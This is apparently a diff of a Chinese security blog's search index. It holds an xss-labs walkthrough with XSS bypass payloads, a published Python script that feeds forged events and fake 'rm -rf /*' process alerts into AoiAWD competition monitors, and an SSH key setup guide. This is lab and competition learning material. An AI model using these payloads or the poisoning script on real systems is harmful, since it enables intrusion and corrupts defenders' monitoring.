-<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">//改后是</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;1111&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">……&gt;//</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">1111&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>……这是输入的部分</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">前后闭合</span></span></span><br></pre></td></tr></table></figure>
-
-<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254225731-154.png" alt="在这里插入图片描述"><br>用了 htmlspeialchars()函数 &lt;&gt;”都被过滤<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254227235-157.png" alt="在这里插入图片描述">二者都写可以</p>
-<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和上面一样</p>
-<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>on 和 script 都被过滤<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254229213-160.png" alt="在这里插入图片描述">这里用 javascript:伪协议<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254230943-163.png" alt="在这里插入图片描述">出来的链接就是答案</p>
-<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>可以大小写绕过</p>
-<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>把特殊字符便空了<br>可以双写绕过</p>
-<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这关卡的死死的<br>要编码绕过<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254233662-166.png"></p>
-<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>strpos 函数看是否有 http:&#x2F;&#x2F;<br>验证是否为安全连接<br>但是没有限定位置<br>要编码下<br>还要把 http:&#x2F;&#x2F;放最后面用&#x2F;&#x2F;注释掉<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254238979-169.png" alt="在这里插入图片描述"></p>
-<h2 id="level-10-13"><a href="#level-10-13" class="headerlink" title="level 10-13"></a>level 10-13</h2><p>页面没有注入点<br>看源代码发现隐藏的表单<br>要改为文本框 text</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">type=&quot;text&quot; onclick=&quot;alert(<span class="number">1</span>)&quot;</span><br></pre></td></tr></table></figure>
-
-<p>后面几关都要改 t_sort<br>因为后端获取 t_sort 和 user-agent 等<br>要从相应注入点注入<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254242198-172.png" alt="在这里插入图片描述"></p>
-<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><blockquote>
-<p>exif xss 漏洞，exif 是可交换图像文件格式（英语：Exchangeable image file format，官方简称 Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到 exif 的相关属性。</p>
-<p>喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数<br>甚至有些照片能看到经纬度<br>这关要用到<br><a href="http://ww1.exifviewer.org/">exifviewer</a>网页<br>但是<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254247114-178.png" alt="在这里插入图片描述"><br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254245020-175.png" alt="在这里插入图片描述"></p>
-</blockquote>
-<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>对 script、&#x2F;、空格进行了转换<br>空格不可以就用换行符</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span>%<span class="number">0</span>atype=&quot;text&quot;%<span class="number">0</span>a&quot;alert&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="level-17-18"><a href="#level-17-18" class="headerlink" title="level 17-18"></a>level 17-18</h2><p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254252815-181.png" alt="在这里插入图片描述"><br>火狐不支持 swf 格式<br>把链接加网页上显示出这样<br>很奇怪<br>开始整套娃了<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254256501-184.png" alt="在这里插入图片描述"></p>
-<p>要找个支持 flash 的浏览器才能正常打开<br>17-20 关都能用 flash xss<br><a href="https://www.secpulse.com/archives/44299.html">flash xss 原理</a><br>但这里先用别的办法<br>以 18 关为例<br>注入点可以在 arg02<br>但是你连 swf 都没有哪来的 moouseover 哪<br>所以得 url 连接一下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/xss-labs/level18.php/xsf02.swf?a=?arg01=a&amp;arg02=%20onmouseover=javascript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254258261-187.png" alt="在这里插入图片描述"></p>
-<h2 id="level-19-20"><a href="#level-19-20" class="headerlink" title="level 19-20"></a>level 19-20</h2><p><a href="https://www.cnblogs.com/-qing-/p/10853379.html">Flash XSS 漏洞快速上手</a><br><a href="https://www.secpulse.com/archives/44299.html">flash xss 原理</a><br><a href="https://github.com/jindrapetrik/jpexs-decompiler">flash 反编译工具</a><br>以下是大佬的 payload</p>
-<blockquote>
-<p>卑微小杨在线 emo<br>flash 反编译也不懂<br>等有空了再研究吧<br>好多困难等着被克服那<br>这次没支持 flash 的浏览器真没法做</p>
-<p>18 关</p>
-</blockquote>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">http: //<span class="number">10.0</span>.<span class="number">1.83</span>/xsslab/level19.php?arg01=version&amp;arg02=&lt;a href=<span class="string">&quot;javascript:alert(/bmfx/)&quot;</span>&gt;bmfx&lt;/a&gt; ;</span><br></pre></td></tr></table></figure>
-
-<p>19 关</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">http: ; //<span class="number">10.0</span>.<span class="number">1.83</span>/xsslab/level20<span class="selector-class">.php</span>?arg01=id&amp;arg02=bmfx\&quot;))&#125;catch(e)&#123;alert(/bmfx/)&#125;//%<span class="number">26</span>width=<span class="number">998%</span><span class="number">26</span>height=<span class="number">998</span></span><br></pre></td></tr></table></figure>
-
-<script>
-setTimeout(function () {
-    alert('xss');
-}, 1000);
-</script>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xss</tag>
-        <tag>xss-lab</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AoiAWD反制脚本</title>
-    <url>/2024/05/untiAoi/</url>
-    <content><![CDATA[<h2 id="AoiAWD-反制脚本"><a href="#AoiAWD-反制脚本" class="headerlink" title="AoiAWD 反制脚本"></a>AoiAWD 反制脚本</h2><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了)</p>
-<p>赛后研究了一下</p>
-<p>开发了这个反制脚本</p>
-<p>由于打点队友喜欢用 gogo</p>
-<p>所以这个脚本支持 gogo 扫描结果</p>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>发现后端未验证来自靶机的数据</p>
-<p>因此存在脏数据污染</p>
-<p>针对此开发脚本</p>
-<p>可向 AoiAWD 的各个数据展示页面投放脏数据</p>
-<p>包括告警页面</p>
-<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>再此公布本脚本，希望下次 awd 遇见的时候别打我，谢谢 QAQ</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./ip.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line">url_list = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">    pattern = <span class="string">r&quot;tcp://(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;:\d+)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, i, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        i = <span class="keyword">match</span>.group(<span class="number">0</span>).split(<span class="string">&quot;//&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        p = <span class="built_in">int</span>(i.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">        i = i.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        server_address = (i, p)  <span class="comment"># 替换SERVER_IP和SERVER_PORT为实际值</span></span><br><span class="line">        data = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;ping&quot;&#125;\n&#x27;</span></span><br><span class="line">        data2 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;new_process&quot;,&quot;data&quot;:&#123;&quot;pid&quot;:&quot;114514&quot;,&quot;ppid&quot;:&quot;114514&quot;,&quot;uid&quot;:&quot;0&quot;,&quot;username&quot;:&quot;root&quot;,&quot;cmd&quot;:&quot;rm -rf /*&quot;,&quot;param&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data3 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:&#123;&quot;path&quot;:&quot;/update/score_points&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;ZmxhZ3tDcmF6eV9UaHVydGhkYXlfdl9tZV81MH0=&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data4 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;web&quot;,&quot;data&quot;:&#123;&quot;scipt&quot;:&quot;/var/www/html/rce.php&quot;,&quot;method&quot;:&quot;post&quot;,&quot;uri&quot;:&quot;127.0.0.1/rce.php&quot;,&quot;remote&quot;:&quot;127.0.0.1&quot;,&quot;buffer&quot;:&quot;&#123;\\&quot;flag\\&quot;:\\&quot;flag&#123;Crazy_Thurthday_v_me_50&#125;\\&quot;&#125;&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data5 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:&#123;&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data6 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:&#123;&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data7 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:&#123;&quot;path&quot;:&quot;/114514&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;c3Ugcm9vdCBybSAtcmYgLyo=&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> sock:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                sock.settimeout(<span class="number">1</span>)</span><br><span class="line">                sock.connect(server_address)</span><br><span class="line">                sock.sendall(data.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                tmp = sock.recvfrom(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;pong&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(tmp):</span><br><span class="line">                    sock.sendall(data2.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data3.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data4.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">                        sock.sendall(data7.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data6.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data5.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;i&#125;</span>\n&quot;</span>)</span><br><span class="line">                    sock.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">f&quot;\n[-] --------------------------------<span class="subst">&#123;i&#125;</span>-------------------------------------\n&quot;</span></span><br><span class="line">                    )</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h3><p>由于分析了各个 AWD 防御工具(Aoi、wathbird 等)</p>
-<p>决定模仿 aoi、并借鉴其他各个工具</p>
-<p>重写一个基于 go(gin 或 iris 大概率会用 gin)的 AWD 监测防御系统</p>
-<p>但是目前没有时间开发(<del>别问，问就是鸽</del>)</p>
-<p><del>预计会在 2025 年 5 月问世</del> ：)</p>
-<p>如果师傅们有留存的各个 AWD 比赛的流量等数据</p>
-<p>以及分析了解过官方 check 机制的师傅</p>
-<p>以及有大量参加 AWD 经验的大师傅</p>
-<p>欢迎联系本菜鸡</p>
-]]></content>
-      <categories>
-        <category>awd</category>
-      </categories>
-      <tags>
-        <tag>awd</tag>
-        <tag>AoiAWD</tag>
-        <tag>反制脚本</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>终端便捷ssh（免密）连接</title>
-    <url>/2023/07/%E5%85%8D%E5%AF%86ssh%E7%99%BB%E5%BD%95/</url>
-    <content><![CDATA[<h2 id="普通-ssh-方法"><a href="#普通-ssh-方法" class="headerlink" title="普通 ssh 方法"></a>普通 ssh 方法</h2><p>物理机 ssh 连接虚拟机</p>
-<p>没基础的可以这样连：复杂</p>
-<p><img src= "https://img-blog.csdnimg.cn/322b3e519c8b4a128c24bed4da2c492b.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存失败,源站可能有防盗下来851229742)(C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220610164418979.png)]"></p>
-<p><img src= "/img/a4fbb966a75d4c8cb76f39f6ad5a6247.png" alt="在这里插入图片描述"></p>
-<h2 id="终端快捷-ssh"><a href="#终端快捷-ssh" class="headerlink" title="终端快捷 ssh"></a>终端快捷 ssh</h2><p>复制<code>&#39;s</code>前面的<br>打开终端设置<br><img src= "/img/9fafbf4213e44ca2ac1c80a1262d9750.png" alt="在这里插入图片描述"></p>
-<p>左侧添加新配置文件-&gt;添加新控制文件</p>
-<p>然后填写第二行即命令行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh 虚拟机登录用户名@虚拟机IP</span><br></pre></td></tr></table></figure>
-
-<p>其实就是 ssh 上面复制的</p>
-<p>保存</p>
-<p><img src= "/img/8240fecdcacd49d6b15ccca9c3debe88.png"></p>
-<p>即可在物理机终端快速打开</p>
-<p><img src= "/img/2314c349c1964a2d8ecf9520e7a294dd.png" alt="在这里插入图片描述"></p>
-<h2 id="免密-ssh-登录"><a href="#免密-ssh-登录" class="headerlink" title="免密 ssh 登录"></a>免密 ssh 登录</h2><p>在物理机运行：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
-
-<p>后面第一个路径回车</p>
-<p>后面密码直接回车（即可实现免密码登录）</p>
-<p><img src= "/img/754f8f550c2345c6a47fe8bb7c4dee29.png" alt="请添加图片描述"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Your identification has been saved in C:\Users\      /.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in C:\Users\            /.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:ln6ZkrhHWH*********tRbGBeooF4g       \    @</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|      .o.*.+     |</span><br><span class="line">|..   o..+ * .    |</span><br><span class="line">|***********.     |</span><br><span class="line">|   *.o.o+.o      |</span><br><span class="line">|. = +.o*S  .     |</span><br><span class="line">| *********       |</span><br><span class="line">+----[SHA256]-----+</span><br></pre></td></tr></table></figure>
-
-<p>找到第一行的那个目录，把 id_rsa.pub 文件复制到虚拟机</p>
-<p>执行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">chmod 770 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>报未找到.ssh 的话</p>
-<p>要先运行<code>ssh-keygen</code>和在物理机设置一样</p>
-</blockquote>
-<p>然后终端打开虚拟机就不用输密码了</p>
-<h2 id="报错情况"><a href="#报错情况" class="headerlink" title="报错情况"></a>报错情况</h2><h3 id="仍需密码："><a href="#仍需密码：" class="headerlink" title="仍需密码："></a>仍需密码：</h3><p>传到虚拟机的 keygen 一定要是公钥 pub</p>
-<h3 id="连接超时"><a href="#连接超时" class="headerlink" title="连接超时"></a>连接超时</h3><p>过一段时间之后 连不上<br>是 ip 未固定<br>需将虚拟机 ip 固定<br>桥接和 net 模式固定 IP 方式会抽空发<br>到时候在这打个传送</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">chmod 700 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>报未找到.ssh 的话</p>
-<p>要先运行<code>ssh-keygen</code>和在物理机设置一样</p>
-</blockquote>
-<p>然后终端打开虚拟机就不用输密码了</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ssh</tag>
       </tags>
   </entry>
   <entry>
@@ -1316,6 +1175,147 @@ setTimeout(function () {
         <tag>web</tag>
         <tag>upload</tag>
         <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AoiAWD反制脚本</title>
+    <url>/2024/05/untiAoi/</url>
+    <content><![CDATA[<h2 id="AoiAWD-反制脚本"><a href="#AoiAWD-反制脚本" class="headerlink" title="AoiAWD 反制脚本"></a>AoiAWD 反制脚本</h2><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了)</p>
+<p>赛后研究了一下</p>
+<p>开发了这个反制脚本</p>
+<p>由于打点队友喜欢用 gogo</p>
+<p>所以这个脚本支持 gogo 扫描结果</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>发现后端未验证来自靶机的数据</p>
+<p>因此存在脏数据污染</p>
+<p>针对此开发脚本</p>
+<p>可向 AoiAWD 的各个数据展示页面投放脏数据</p>
+<p>包括告警页面</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>再此公布本脚本，希望下次 awd 遇见的时候别打我，谢谢 QAQ</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./ip.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line">url_list = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">    pattern = <span class="string">r&quot;tcp://(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;:\d+)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, i, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        i = <span class="keyword">match</span>.group(<span class="number">0</span>).split(<span class="string">&quot;//&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        p = <span class="built_in">int</span>(i.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">        i = i.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        server_address = (i, p)  <span class="comment"># 替换SERVER_IP和SERVER_PORT为实际值</span></span><br><span class="line">        data = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;ping&quot;&#125;\n&#x27;</span></span><br><span class="line">        data2 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;new_process&quot;,&quot;data&quot;:&#123;&quot;pid&quot;:&quot;114514&quot;,&quot;ppid&quot;:&quot;114514&quot;,&quot;uid&quot;:&quot;0&quot;,&quot;username&quot;:&quot;root&quot;,&quot;cmd&quot;:&quot;rm -rf /*&quot;,&quot;param&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data3 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:&#123;&quot;path&quot;:&quot;/update/score_points&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;ZmxhZ3tDcmF6eV9UaHVydGhkYXlfdl9tZV81MH0=&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data4 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;web&quot;,&quot;data&quot;:&#123;&quot;scipt&quot;:&quot;/var/www/html/rce.php&quot;,&quot;method&quot;:&quot;post&quot;,&quot;uri&quot;:&quot;127.0.0.1/rce.php&quot;,&quot;remote&quot;:&quot;127.0.0.1&quot;,&quot;buffer&quot;:&quot;&#123;\\&quot;flag\\&quot;:\\&quot;flag&#123;Crazy_Thurthday_v_me_50&#125;\\&quot;&#125;&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data5 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:&#123;&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data6 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:&#123;&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data7 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:&#123;&quot;path&quot;:&quot;/114514&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;c3Ugcm9vdCBybSAtcmYgLyo=&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> sock:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                sock.settimeout(<span class="number">1</span>)</span><br><span class="line">                sock.connect(server_address)</span><br><span class="line">                sock.sendall(data.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                tmp = sock.recvfrom(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;pong&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(tmp):</span><br><span class="line">                    sock.sendall(data2.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data3.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data4.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">                        sock.sendall(data7.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data6.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data5.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;i&#125;</span>\n&quot;</span>)</span><br><span class="line">                    sock.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">f&quot;\n[-] --------------------------------<span class="subst">&#123;i&#125;</span>-------------------------------------\n&quot;</span></span><br><span class="line">                    )</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h3><p>由于分析了各个 AWD 防御工具(Aoi、wathbird 等)</p>
+<p>决定模仿 aoi、并借鉴其他各个工具</p>
+<p>重写一个基于 go(gin 或 iris 大概率会用 gin)的 AWD 监测防御系统</p>
+<p>但是目前没有时间开发(<del>别问，问就是鸽</del>)</p>
+<p><del>预计会在 2025 年 5 月问世</del> ：)</p>
+<p>如果师傅们有留存的各个 AWD 比赛的流量等数据</p>
+<p>以及分析了解过官方 check 机制的师傅</p>
+<p>以及有大量参加 AWD 经验的大师傅</p>
+<p>欢迎联系本菜鸡</p>
+]]></content>
+      <categories>
+        <category>awd</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+        <tag>AoiAWD</tag>
+        <tag>反制脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xss-lab</title>
+    <url>/2023/07/xsslab/</url>
+    <content><![CDATA[<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>没啥好说的<br>直接 alert<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254223669-151.png" alt="在这里插入图片描述"></p>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">//改后是</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;1111&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">……&gt;//</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">1111&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>……这是输入的部分</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">前后闭合</span></span></span><br></pre></td></tr></table></figure>
+
